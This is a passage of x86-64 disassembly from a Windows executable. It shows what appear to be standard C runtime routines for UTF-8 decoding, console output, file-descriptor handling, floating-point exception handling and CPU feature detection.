   14000bdfd:	eb 1e                	jmp    0x14000be1d
   14000bdff:	0f b6 0f             	movzbl (%rdi),%ecx
   14000be02:	48 ff c7             	inc    %rdi
   14000be05:	8a c1                	mov    %cl,%al
   14000be07:	24 c0                	and    $0xc0,%al
   14000be09:	3c 80                	cmp    $0x80,%al
   14000be0b:	0f 85 89 00 00 00    	jne    0x14000be9a
   14000be11:	8b c2                	mov    %edx,%eax
   14000be13:	83 e1 3f             	and    $0x3f,%ecx
   14000be16:	c1 e0 06             	shl    $0x6,%eax
   14000be19:	8b d1                	mov    %ecx,%edx
   14000be1b:	0b d0                	or     %eax,%edx
   14000be1d:	48 8b c7             	mov    %rdi,%rax
   14000be20:	49 2b c4             	sub    %r12,%rax
   14000be23:	49 3b c1             	cmp    %r9,%rax
   14000be26:	72 d7                	jb     0x14000bdff
   14000be28:	4c 3b cd             	cmp    %rbp,%r9
   14000be2b:	73 1c                	jae    0x14000be49
   14000be2d:	41 0f b6 c0          	movzbl %r8b,%eax
   14000be31:	41 2a d9             	sub    %r9b,%bl
   14000be34:	66 41 89 42 04       	mov    %ax,0x4(%r10)
   14000be39:	0f b6 c3             	movzbl %bl,%eax
   14000be3c:	66 41 89 42 06       	mov    %ax,0x6(%r10)
   14000be41:	41 89 12             	mov    %edx,(%r10)
   14000be44:	e9 03 ff ff ff       	jmp    0x14000bd4c
   14000be49:	8d 82 00 28 ff ff    	lea    -0xd800(%rdx),%eax
   14000be4f:	3d ff 07 00 00       	cmp    $0x7ff,%eax
   14000be54:	76 44                	jbe    0x14000be9a
   14000be56:	81 fa 00 00 11 00    	cmp    $0x110000,%edx
   14000be5c:	73 3c                	jae    0x14000be9a
   14000be5e:	41 0f b6 c0          	movzbl %r8b,%eax
   14000be62:	c7 44 24 20 80 00 00 	movl   $0x80,0x20(%rsp)
   14000be69:	00 
   14000be6a:	c7 44 24 24 00 08 00 	movl   $0x800,0x24(%rsp)
   14000be71:	00 
   14000be72:	c7 44 24 28 00 00 01 	movl   $0x10000,0x28(%rsp)
   14000be79:	00 
   14000be7a:	3b 54 84 18          	cmp    0x18(%rsp,%rax,4),%edx
   14000be7e:	72 1a                	jb     0x14000be9a
   14000be80:	4d 85 f6             	test   %r14,%r14
   14000be83:	74 03                	je     0x14000be88
   14000be85:	41 89 16             	mov    %edx,(%r14)
   14000be88:	f7 da                	neg    %edx
   14000be8a:	49 8b d2             	mov    %r10,%rdx
   14000be8d:	48 1b c9             	sbb    %rcx,%rcx
   14000be90:	48 23 cd             	and    %rbp,%rcx
   14000be93:	e8 34 fe ff ff       	call   0x14000bccc
   14000be98:	eb 0b                	jmp    0x14000bea5
   14000be9a:	48 8b d6             	mov    %rsi,%rdx
   14000be9d:	49 8b ca             	mov    %r10,%rcx
   14000bea0:	e8 2f fe ff ff       	call   0x14000bcd4
   14000bea5:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   14000beaa:	48 33 cc             	xor    %rsp,%rcx
   14000bead:	e8 1e 0d 00 00       	call   0x14000cbd0
   14000beb2:	48 83 c4 40          	add    $0x40,%rsp
   14000beb6:	41 5f                	pop    %r15
   14000beb8:	41 5e                	pop    %r14
   14000beba:	41 5c                	pop    %r12
   14000bebc:	5f                   	pop    %rdi
   14000bebd:	5e                   	pop    %rsi
   14000bebe:	5d                   	pop    %rbp
   14000bebf:	5b                   	pop    %rbx
   14000bec0:	c3                   	ret
   14000bec1:	cc                   	int3
   14000bec2:	cc                   	int3
   14000bec3:	cc                   	int3
   14000bec4:	40 53                	rex push %rbx
   14000bec6:	48 83 ec 40          	sub    $0x40,%rsp
   14000beca:	48 8b 05 5f cb 00 00 	mov    0xcb5f(%rip),%rax        # 0x140018a30
   14000bed1:	33 db                	xor    %ebx,%ebx
   14000bed3:	48 83 f8 fe          	cmp    $0xfffffffffffffffe,%rax
   14000bed7:	75 2e                	jne    0x14000bf07
   14000bed9:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   14000bede:	44 8d 43 03          	lea    0x3(%rbx),%r8d
   14000bee2:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   14000bee6:	48 8d 0d 63 80 00 00 	lea    0x8063(%rip),%rcx        # 0x140013f50
   14000beed:	45 33 c9             	xor    %r9d,%r9d
   14000bef0:	44 89 44 24 20       	mov    %r8d,0x20(%rsp)
   14000bef5:	ba 00 00 00 40       	mov    $0x40000000,%edx
   14000befa:	ff 15 30 23 00 00    	call   *0x2330(%rip)        # 0x14000e230
   14000bf00:	48 89 05 29 cb 00 00 	mov    %rax,0xcb29(%rip)        # 0x140018a30
   14000bf07:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000bf0b:	0f 95 c3             	setne  %bl
   14000bf0e:	8b c3                	mov    %ebx,%eax
   14000bf10:	48 83 c4 40          	add    $0x40,%rsp
   14000bf14:	5b                   	pop    %rbx
   14000bf15:	c3                   	ret
   14000bf16:	cc                   	int3
   14000bf17:	cc                   	int3
   14000bf18:	48 83 ec 28          	sub    $0x28,%rsp
   14000bf1c:	48 8b 0d 0d cb 00 00 	mov    0xcb0d(%rip),%rcx        # 0x140018a30
   14000bf23:	48 83 f9 fd          	cmp    $0xfffffffffffffffd,%rcx
   14000bf27:	77 06                	ja     0x14000bf2f
   14000bf29:	ff 15 51 21 00 00    	call   *0x2151(%rip)        # 0x14000e080
   14000bf2f:	48 83 c4 28          	add    $0x28,%rsp
   14000bf33:	c3                   	ret
   14000bf34:	48 8b c4             	mov    %rsp,%rax
   14000bf37:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000bf3b:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000bf3f:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000bf43:	57                   	push   %rdi
   14000bf44:	48 83 ec 40          	sub    $0x40,%rsp
   14000bf48:	48 83 60 d8 00       	andq   $0x0,-0x28(%rax)
   14000bf4d:	49 8b f8             	mov    %r8,%rdi
   14000bf50:	4d 8b c8             	mov    %r8,%r9
   14000bf53:	8b f2                	mov    %edx,%esi
   14000bf55:	44 8b c2             	mov    %edx,%r8d
   14000bf58:	48 8b e9             	mov    %rcx,%rbp
   14000bf5b:	48 8b d1             	mov    %rcx,%rdx
   14000bf5e:	48 8b 0d cb ca 00 00 	mov    0xcacb(%rip),%rcx        # 0x140018a30
   14000bf65:	ff 15 9d 20 00 00    	call   *0x209d(%rip)        # 0x14000e008
   14000bf6b:	8b d8                	mov    %eax,%ebx
   14000bf6d:	85 c0                	test   %eax,%eax
   14000bf6f:	75 6a                	jne    0x14000bfdb
   14000bf71:	ff 15 19 21 00 00    	call   *0x2119(%rip)        # 0x14000e090
   14000bf77:	83 f8 06             	cmp    $0x6,%eax
   14000bf7a:	75 5f                	jne    0x14000bfdb
   14000bf7c:	48 8b 0d ad ca 00 00 	mov    0xcaad(%rip),%rcx        # 0x140018a30
   14000bf83:	48 83 f9 fd          	cmp    $0xfffffffffffffffd,%rcx
   14000bf87:	77 06                	ja     0x14000bf8f
   14000bf89:	ff 15 f1 20 00 00    	call   *0x20f1(%rip)        # 0x14000e080
   14000bf8f:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   14000bf95:	48 8d 0d b4 7f 00 00 	lea    0x7fb4(%rip),%rcx        # 0x140013f50
   14000bf9c:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   14000bfa1:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   14000bfa7:	45 33 c9             	xor    %r9d,%r9d
   14000bfaa:	44 89 44 24 20       	mov    %r8d,0x20(%rsp)
   14000bfaf:	ba 00 00 00 40       	mov    $0x40000000,%edx
   14000bfb4:	ff 15 76 22 00 00    	call   *0x2276(%rip)        # 0x14000e230
   14000bfba:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000bfc0:	4c 8b cf             	mov    %rdi,%r9
   14000bfc3:	48 8b c8             	mov    %rax,%rcx
   14000bfc6:	48 89 05 63 ca 00 00 	mov    %rax,0xca63(%rip)        # 0x140018a30
   14000bfcd:	44 8b c6             	mov    %esi,%r8d
   14000bfd0:	48 8b d5             	mov    %rbp,%rdx
   14000bfd3:	ff 15 2f 20 00 00    	call   *0x202f(%rip)        # 0x14000e008
   14000bfd9:	8b d8                	mov    %eax,%ebx
   14000bfdb:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   14000bfe0:	8b c3                	mov    %ebx,%eax
   14000bfe2:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   14000bfe7:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   14000bfec:	48 83 c4 40          	add    $0x40,%rsp
   14000bff0:	5f                   	pop    %rdi
   14000bff1:	c3                   	ret
   14000bff2:	cc                   	int3
   14000bff3:	cc                   	int3
   14000bff4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000bff9:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000bffe:	57                   	push   %rdi
   14000bfff:	48 83 ec 20          	sub    $0x20,%rsp
   14000c003:	49 8b f9             	mov    %r9,%rdi
   14000c006:	49 8b d8             	mov    %r8,%rbx
   14000c009:	8b 0a                	mov    (%rdx),%ecx
   14000c00b:	e8 24 bc ff ff       	call   0x140007c34
   14000c010:	90                   	nop
   14000c011:	48 8b 03             	mov    (%rbx),%rax
   14000c014:	48 63 08             	movslq (%rax),%rcx
   14000c017:	4c 8b d1             	mov    %rcx,%r10
   14000c01a:	48 8b 53 08          	mov    0x8(%rbx),%rdx
   14000c01e:	48 8b c1             	mov    %rcx,%rax
   14000c021:	48 c1 f8 06          	sar    $0x6,%rax
   14000c025:	4c 8d 0d c4 d1 00 00 	lea    0xd1c4(%rip),%r9        # 0x1400191f0
   14000c02c:	41 83 e2 3f          	and    $0x3f,%r10d
   14000c030:	4f 8d 04 d2          	lea    (%r10,%r10,8),%r8
   14000c034:	49 8b 04 c1          	mov    (%r9,%rax,8),%rax
   14000c038:	42 f6 44 c0 38 01    	testb  $0x1,0x38(%rax,%r8,8)
   14000c03e:	74 09                	je     0x14000c049
   14000c040:	e8 eb 00 00 00       	call   0x14000c130
   14000c045:	8b d8                	mov    %eax,%ebx
   14000c047:	eb 0e                	jmp    0x14000c057
   14000c049:	c6 42 30 01          	movb   $0x1,0x30(%rdx)
   14000c04d:	c7 42 2c 09 00 00 00 	movl   $0x9,0x2c(%rdx)
   14000c054:	83 cb ff             	or     $0xffffffff,%ebx
   14000c057:	8b 0f                	mov    (%rdi),%ecx
   14000c059:	e8 fe bb ff ff       	call   0x140007c5c
   14000c05e:	8b c3                	mov    %ebx,%eax
   14000c060:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000c065:	48 83 c4 20          	add    $0x20,%rsp
   14000c069:	5f                   	pop    %rdi
   14000c06a:	c3                   	ret
   14000c06b:	cc                   	int3
   14000c06c:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   14000c070:	48 83 ec 58          	sub    $0x58,%rsp
   14000c074:	4c 63 c1             	movslq %ecx,%r8
   14000c077:	45 33 c9             	xor    %r9d,%r9d
   14000c07a:	41 83 f8 fe          	cmp    $0xfffffffe,%r8d
   14000c07e:	75 18                	jne    0x14000c098
   14000c080:	c6 42 38 01          	movb   $0x1,0x38(%rdx)
   14000c084:	44 89 4a 34          	mov    %r9d,0x34(%rdx)
   14000c088:	c6 42 30 01          	movb   $0x1,0x30(%rdx)
   14000c08c:	c7 42 2c 09 00 00 00 	movl   $0x9,0x2c(%rdx)
   14000c093:	e9 8d 00 00 00       	jmp    0x14000c125
   14000c098:	85 c9                	test   %ecx,%ecx
   14000c09a:	78 60                	js     0x14000c0fc
   14000c09c:	44 3b 05 4d d5 00 00 	cmp    0xd54d(%rip),%r8d        # 0x1400195f0
   14000c0a3:	73 57                	jae    0x14000c0fc
   14000c0a5:	49 8b c8             	mov    %r8,%rcx
   14000c0a8:	4c 8d 15 41 d1 00 00 	lea    0xd141(%rip),%r10        # 0x1400191f0
   14000c0af:	83 e1 3f             	and    $0x3f,%ecx
   14000c0b2:	49 8b c0             	mov    %r8,%rax
   14000c0b5:	48 c1 f8 06          	sar    $0x6,%rax
   14000c0b9:	48 8d 0c c9          	lea    (%rcx,%rcx,8),%rcx
   14000c0bd:	49 8b 04 c2          	mov    (%r10,%rax,8),%rax
   14000c0c1:	f6 44 c8 38 01       	testb  $0x1,0x38(%rax,%rcx,8)
   14000c0c6:	74 34                	je     0x14000c0fc
   14000c0c8:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   14000c0cd:	48 89 54 24 40       	mov    %rdx,0x40(%rsp)
   14000c0d2:	44 89 44 24 78       	mov    %r8d,0x78(%rsp)
   14000c0d7:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   14000c0dc:	44 89 44 24 30       	mov    %r8d,0x30(%rsp)
   14000c0e1:	4c 8d 4c 24 78       	lea    0x78(%rsp),%r9
   14000c0e6:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   14000c0eb:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   14000c0f0:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   14000c0f5:	e8 fa fe ff ff       	call   0x14000bff4
   14000c0fa:	eb 2c                	jmp    0x14000c128
   14000c0fc:	c6 42 38 01          	movb   $0x1,0x38(%rdx)
   14000c100:	45 33 c0             	xor    %r8d,%r8d
   14000c103:	44 89 4a 34          	mov    %r9d,0x34(%rdx)
   14000c107:	33 c9                	xor    %ecx,%ecx
   14000c109:	c6 42 30 01          	movb   $0x1,0x30(%rdx)
   14000c10d:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
   14000c112:	c7 42 2c 09 00 00 00 	movl   $0x9,0x2c(%rdx)
   14000c119:	33 d2                	xor    %edx,%edx
   14000c11b:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000c120:	e8 47 a1 ff ff       	call   0x14000626c
   14000c125:	83 c8 ff             	or     $0xffffffff,%eax
   14000c128:	48 83 c4 58          	add    $0x58,%rsp
   14000c12c:	c3                   	ret
   14000c12d:	cc                   	int3
   14000c12e:	cc                   	int3
   14000c12f:	cc                   	int3
   14000c130:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000c135:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000c13a:	57                   	push   %rdi
   14000c13b:	48 83 ec 20          	sub    $0x20,%rsp
   14000c13f:	48 63 f9             	movslq %ecx,%rdi
   14000c142:	48 8b f2             	mov    %rdx,%rsi
   14000c145:	8b cf                	mov    %edi,%ecx
   14000c147:	e8 f4 bb ff ff       	call   0x140007d40
   14000c14c:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000c150:	75 04                	jne    0x14000c156
   14000c152:	33 db                	xor    %ebx,%ebx
   14000c154:	eb 5a                	jmp    0x14000c1b0
   14000c156:	48 8b 05 93 d0 00 00 	mov    0xd093(%rip),%rax        # 0x1400191f0
   14000c15d:	b9 02 00 00 00       	mov    $0x2,%ecx
   14000c162:	83 ff 01             	cmp    $0x1,%edi
   14000c165:	75 09                	jne    0x14000c170
   14000c167:	40 84 b8 c8 00 00 00 	test   %dil,0xc8(%rax)
   14000c16e:	75 0d                	jne    0x14000c17d
   14000c170:	3b f9                	cmp    %ecx,%edi
   14000c172:	75 20                	jne    0x14000c194
   14000c174:	f6 80 80 00 00 00 01 	testb  $0x1,0x80(%rax)
   14000c17b:	74 17                	je     0x14000c194
   14000c17d:	e8 be bb ff ff       	call   0x140007d40
   14000c182:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000c187:	48 8b d8             	mov    %rax,%rbx
   14000c18a:	e8 b1 bb ff ff       	call   0x140007d40
   14000c18f:	48 3b c3             	cmp    %rbx,%rax
   14000c192:	74 be                	je     0x14000c152
   14000c194:	8b cf                	mov    %edi,%ecx
   14000c196:	e8 a5 bb ff ff       	call   0x140007d40
   14000c19b:	48 8b c8             	mov    %rax,%rcx
   14000c19e:	ff 15 dc 1e 00 00    	call   *0x1edc(%rip)        # 0x14000e080
   14000c1a4:	85 c0                	test   %eax,%eax
   14000c1a6:	75 aa                	jne    0x14000c152
   14000c1a8:	ff 15 e2 1e 00 00    	call   *0x1ee2(%rip)        # 0x14000e090
   14000c1ae:	8b d8                	mov    %eax,%ebx
   14000c1b0:	8b cf                	mov    %edi,%ecx
   14000c1b2:	e8 cd ba ff ff       	call   0x140007c84
   14000c1b7:	48 8b d7             	mov    %rdi,%rdx
   14000c1ba:	4c 8d 05 2f d0 00 00 	lea    0xd02f(%rip),%r8        # 0x1400191f0
   14000c1c1:	83 e2 3f             	and    $0x3f,%edx
   14000c1c4:	48 8b cf             	mov    %rdi,%rcx
   14000c1c7:	48 c1 f9 06          	sar    $0x6,%rcx
   14000c1cb:	48 8d 14 d2          	lea    (%rdx,%rdx,8),%rdx
   14000c1cf:	49 8b 0c c8          	mov    (%r8,%rcx,8),%rcx
   14000c1d3:	c6 44 d1 38 00       	movb   $0x0,0x38(%rcx,%rdx,8)
   14000c1d8:	85 db                	test   %ebx,%ebx
   14000c1da:	74 0f                	je     0x14000c1eb
   14000c1dc:	48 8b d6             	mov    %rsi,%rdx
   14000c1df:	8b cb                	mov    %ebx,%ecx
   14000c1e1:	e8 6a a3 ff ff       	call   0x140006550
   14000c1e6:	83 c8 ff             	or     $0xffffffff,%eax
   14000c1e9:	eb 02                	jmp    0x14000c1ed
   14000c1eb:	33 c0                	xor    %eax,%eax
   14000c1ed:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000c1f2:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000c1f7:	48 83 c4 20          	add    $0x20,%rsp
   14000c1fb:	5f                   	pop    %rdi
   14000c1fc:	c3                   	ret
   14000c1fd:	cc                   	int3
   14000c1fe:	cc                   	int3
   14000c1ff:	cc                   	int3
   14000c200:	83 49 18 ff          	orl    $0xffffffff,0x18(%rcx)
   14000c204:	33 c0                	xor    %eax,%eax
   14000c206:	48 89 01             	mov    %rax,(%rcx)
   14000c209:	48 89 41 08          	mov    %rax,0x8(%rcx)
   14000c20d:	89 41 10             	mov    %eax,0x10(%rcx)
   14000c210:	48 89 41 1c          	mov    %rax,0x1c(%rcx)
   14000c214:	48 89 41 28          	mov    %rax,0x28(%rcx)
   14000c218:	87 41 14             	xchg   %eax,0x14(%rcx)
   14000c21b:	c3                   	ret
   14000c21c:	48 8b c4             	mov    %rsp,%rax
   14000c21f:	53                   	push   %rbx
   14000c220:	48 83 ec 50          	sub    $0x50,%rsp
   14000c224:	f2 0f 10 84 24 80 00 	movsd  0x80(%rsp),%xmm0
   14000c22b:	00 00 
   14000c22d:	8b d9                	mov    %ecx,%ebx
   14000c22f:	f2 0f 10 8c 24 88 00 	movsd  0x88(%rsp),%xmm1
   14000c236:	00 00 
   14000c238:	ba c0 ff 00 00       	mov    $0xffc0,%edx
   14000c23d:	89 48 c8             	mov    %ecx,-0x38(%rax)
   14000c240:	48 8b 8c 24 90 00 00 	mov    0x90(%rsp),%rcx
   14000c247:	00 
   14000c248:	f2 0f 11 40 e0       	movsd  %xmm0,-0x20(%rax)
   14000c24d:	f2 0f 11 48 e8       	movsd  %xmm1,-0x18(%rax)
   14000c252:	f2 0f 11 58 d8       	movsd  %xmm3,-0x28(%rax)
   14000c257:	4c 89 40 d0          	mov    %r8,-0x30(%rax)
   14000c25b:	e8 28 07 00 00       	call   0x14000c988
   14000c260:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000c265:	e8 62 82 ff ff       	call   0x1400044cc
   14000c26a:	85 c0                	test   %eax,%eax
   14000c26c:	75 07                	jne    0x14000c275
   14000c26e:	8b cb                	mov    %ebx,%ecx
   14000c270:	e8 c3 06 00 00       	call   0x14000c938
   14000c275:	f2 0f 10 44 24 40    	movsd  0x40(%rsp),%xmm0
   14000c27b:	48 83 c4 50          	add    $0x50,%rsp
   14000c27f:	5b                   	pop    %rbx
   14000c280:	c3                   	ret
   14000c281:	cc                   	int3
   14000c282:	cc                   	int3
   14000c283:	cc                   	int3
   14000c284:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000c289:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000c28e:	57                   	push   %rdi
   14000c28f:	48 83 ec 20          	sub    $0x20,%rsp
   14000c293:	8b d9                	mov    %ecx,%ebx
   14000c295:	48 8b f2             	mov    %rdx,%rsi
   14000c298:	83 e3 1f             	and    $0x1f,%ebx
   14000c29b:	8b f9                	mov    %ecx,%edi
   14000c29d:	f6 c1 08             	test   $0x8,%cl
   14000c2a0:	74 14                	je     0x14000c2b6
   14000c2a2:	40 84 f6             	test   %sil,%sil
   14000c2a5:	79 0f                	jns    0x14000c2b6
   14000c2a7:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000c2ac:	e8 53 07 00 00       	call   0x14000ca04
   14000c2b1:	83 e3 f7             	and    $0xfffffff7,%ebx
   14000c2b4:	eb 57                	jmp    0x14000c30d
   14000c2b6:	b9 04 00 00 00       	mov    $0x4,%ecx
   14000c2bb:	40 84 f9             	test   %dil,%cl
   14000c2be:	74 11                	je     0x14000c2d1
   14000c2c0:	48 0f ba e6 09       	bt     $0x9,%rsi
   14000c2c5:	73 0a                	jae    0x14000c2d1
   14000c2c7:	e8 38 07 00 00       	call   0x14000ca04
   14000c2cc:	83 e3 fb             	and    $0xfffffffb,%ebx
   14000c2cf:	eb 3c                	jmp    0x14000c30d
   14000c2d1:	40 f6 c7 01          	test   $0x1,%dil
   14000c2d5:	74 16                	je     0x14000c2ed
   14000c2d7:	48 0f ba e6 0a       	bt     $0xa,%rsi
   14000c2dc:	73 0f                	jae    0x14000c2ed
   14000c2de:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000c2e3:	e8 1c 07 00 00       	call   0x14000ca04
   14000c2e8:	83 e3 fe             	and    $0xfffffffe,%ebx
   14000c2eb:	eb 20                	jmp    0x14000c30d
   14000c2ed:	40 f6 c7 02          	test   $0x2,%dil
   14000c2f1:	74 1a                	je     0x14000c30d
   14000c2f3:	48 0f ba e6 0b       	bt     $0xb,%rsi
   14000c2f8:	73 13                	jae    0x14000c30d
   14000c2fa:	40 f6 c7 10          	test   $0x10,%dil
   14000c2fe:	74 0a                	je     0x14000c30a
   14000c300:	b9 10 00 00 00       	mov    $0x10,%ecx
   14000c305:	e8 fa 06 00 00       	call   0x14000ca04
   14000c30a:	83 e3 fd             	and    $0xfffffffd,%ebx
   14000c30d:	40 f6 c7 10          	test   $0x10,%dil
   14000c311:	74 14                	je     0x14000c327
   14000c313:	48 0f ba e6 0c       	bt     $0xc,%rsi
   14000c318:	73 0d                	jae    0x14000c327
   14000c31a:	b9 20 00 00 00       	mov    $0x20,%ecx
   14000c31f:	e8 e0 06 00 00       	call   0x14000ca04
   14000c324:	83 e3 ef             	and    $0xffffffef,%ebx
   14000c327:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000c32c:	33 c0                	xor    %eax,%eax
   14000c32e:	85 db                	test   %ebx,%ebx
   14000c330:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000c335:	0f 94 c0             	sete   %al
   14000c338:	48 83 c4 20          	add    $0x20,%rsp
   14000c33c:	5f                   	pop    %rdi
   14000c33d:	c3                   	ret
   14000c33e:	cc                   	int3
   14000c33f:	cc                   	int3
   14000c340:	48 8b c4             	mov    %rsp,%rax
   14000c343:	55                   	push   %rbp
   14000c344:	53                   	push   %rbx
   14000c345:	56                   	push   %rsi
   14000c346:	57                   	push   %rdi
   14000c347:	41 56                	push   %r14
   14000c349:	48 8d 68 c9          	lea    -0x37(%rax),%rbp
   14000c34d:	48 81 ec e0 00 00 00 	sub    $0xe0,%rsp
   14000c354:	0f 29 70 c8          	movaps %xmm6,-0x38(%rax)
   14000c358:	48 8b 05 e1 bc 00 00 	mov    0xbce1(%rip),%rax        # 0x140018040
   14000c35f:	48 33 c4             	xor    %rsp,%rax
   14000c362:	48 89 45 ef          	mov    %rax,-0x11(%rbp)
   14000c366:	8b f2                	mov    %edx,%esi
   14000c368:	4c 8b f1             	mov    %rcx,%r14
   14000c36b:	ba c0 ff 00 00       	mov    $0xffc0,%edx
   14000c370:	b9 80 1f 00 00       	mov    $0x1f80,%ecx
   14000c375:	41 8b f9             	mov    %r9d,%edi
   14000c378:	49 8b d8             	mov    %r8,%rbx
   14000c37b:	e8 08 06 00 00       	call   0x14000c988
   14000c380:	8b 4d 5f             	mov    0x5f(%rbp),%ecx
   14000c383:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   14000c388:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   14000c38d:	f2 0f 10 44 24 40    	movsd  0x40(%rsp),%xmm0
   14000c393:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   14000c398:	f2 0f 11 44 24 40    	movsd  %xmm0,0x40(%rsp)
   14000c39e:	e8 e1 fe ff ff       	call   0x14000c284
   14000c3a3:	f2 0f 10 75 77       	movsd  0x77(%rbp),%xmm6
   14000c3a8:	85 c0                	test   %eax,%eax
   14000c3aa:	75 40                	jne    0x14000c3ec
   14000c3ac:	83 7d 7f 02          	cmpl   $0x2,0x7f(%rbp)
   14000c3b0:	75 11                	jne    0x14000c3c3
   14000c3b2:	8b 45 bf             	mov    -0x41(%rbp),%eax
   14000c3b5:	83 e0 e3             	and    $0xffffffe3,%eax
   14000c3b8:	f2 0f 11 75 af       	movsd  %xmm6,-0x51(%rbp)
   14000c3bd:	83 c8 03             	or     $0x3,%eax
   14000c3c0:	89 45 bf             	mov    %eax,-0x41(%rbp)
   14000c3c3:	44 8b 45 5f          	mov    0x5f(%rbp),%r8d
   14000c3c7:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   14000c3cc:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000c3d1:	48 8d 54 24 48       	lea    0x48(%rsp),%rdx
   14000c3d6:	48 8d 45 6f          	lea    0x6f(%rbp),%rax
   14000c3da:	44 8b ce             	mov    %esi,%r9d
   14000c3dd:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   14000c3e2:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000c3e7:	e8 14 02 00 00       	call   0x14000c600
   14000c3ec:	e8 b3 80 ff ff       	call   0x1400044a4
   14000c3f1:	84 c0                	test   %al,%al
   14000c3f3:	74 34                	je     0x14000c429
   14000c3f5:	85 ff                	test   %edi,%edi
   14000c3f7:	74 30                	je     0x14000c429
   14000c3f9:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   14000c3fe:	4d 8b c6             	mov    %r14,%r8
   14000c401:	f2 0f 10 44 24 40    	movsd  0x40(%rsp),%xmm0
   14000c407:	8b cf                	mov    %edi,%ecx
   14000c409:	f2 0f 10 5d 6f       	movsd  0x6f(%rbp),%xmm3
   14000c40e:	8b 55 67             	mov    0x67(%rbp),%edx
   14000c411:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000c416:	f2 0f 11 44 24 28    	movsd  %xmm0,0x28(%rsp)
   14000c41c:	f2 0f 11 74 24 20    	movsd  %xmm6,0x20(%rsp)
   14000c422:	e8 f5 fd ff ff       	call   0x14000c21c
   14000c427:	eb 1c                	jmp    0x14000c445
   14000c429:	8b cf                	mov    %edi,%ecx
   14000c42b:	e8 08 05 00 00       	call   0x14000c938
   14000c430:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   14000c435:	ba c0 ff 00 00       	mov    $0xffc0,%edx
   14000c43a:	e8 49 05 00 00       	call   0x14000c988
   14000c43f:	f2 0f 10 44 24 40    	movsd  0x40(%rsp),%xmm0
   14000c445:	48 8b 4d ef          	mov    -0x11(%rbp),%rcx
   14000c449:	48 33 cc             	xor    %rsp,%rcx
   14000c44c:	e8 7f 07 00 00       	call   0x14000cbd0
   14000c451:	0f 28 b4 24 d0 00 00 	movaps 0xd0(%rsp),%xmm6
   14000c458:	00 
   14000c459:	48 81 c4 e0 00 00 00 	add    $0xe0,%rsp
   14000c460:	41 5e                	pop    %r14
   14000c462:	5f                   	pop    %rdi
   14000c463:	5e                   	pop    %rsi
   14000c464:	5b                   	pop    %rbx
   14000c465:	5d                   	pop    %rbp
   14000c466:	c3                   	ret
   14000c467:	cc                   	int3
   14000c468:	cc                   	int3
   14000c469:	cc                   	int3
   14000c46a:	cc                   	int3
   14000c46b:	cc                   	int3
   14000c46c:	cc                   	int3
   14000c46d:	cc                   	int3
   14000c46e:	cc                   	int3
   14000c46f:	cc                   	int3
   14000c470:	40 53                	rex push %rbx
   14000c472:	48 83 ec 10          	sub    $0x10,%rsp
   14000c476:	45 33 c0             	xor    %r8d,%r8d
   14000c479:	33 c9                	xor    %ecx,%ecx
   14000c47b:	44 89 05 76 d3 00 00 	mov    %r8d,0xd376(%rip)        # 0x1400197f8
   14000c482:	45 8d 48 01          	lea    0x1(%r8),%r9d
   14000c486:	41 8b c1             	mov    %r9d,%eax
   14000c489:	0f a2                	cpuid
   14000c48b:	89 04 24             	mov    %eax,(%rsp)
   14000c48e:	b8 00 10 00 18       	mov    $0x18001000,%eax
   14000c493:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   14000c497:	23 c8                	and    %eax,%ecx
   14000c499:	89 5c 24 04          	mov    %ebx,0x4(%rsp)
   14000c49d:	89 54 24 0c          	mov    %edx,0xc(%rsp)
   14000c4a1:	3b c8                	cmp    %eax,%ecx
   14000c4a3:	75 2c                	jne    0x14000c4d1
   14000c4a5:	33 c9                	xor    %ecx,%ecx
   14000c4a7:	0f 01 d0             	xgetbv
   14000c4aa:	48 c1 e2 20          	shl    $0x20,%rdx
   14000c4ae:	48 0b d0             	or     %rax,%rdx
